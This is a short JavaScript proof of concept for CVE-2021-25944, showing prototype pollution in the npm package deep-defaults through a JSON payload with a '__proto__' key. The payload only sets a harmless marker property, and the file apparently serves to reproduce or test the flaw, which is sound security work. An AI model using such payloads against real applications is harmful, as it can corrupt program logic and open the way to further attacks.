//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944
var deepDefaults = require("deep-defaults");
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
var obj = {};

deepDefaults(obj, JSON.parse(malicious_payload));
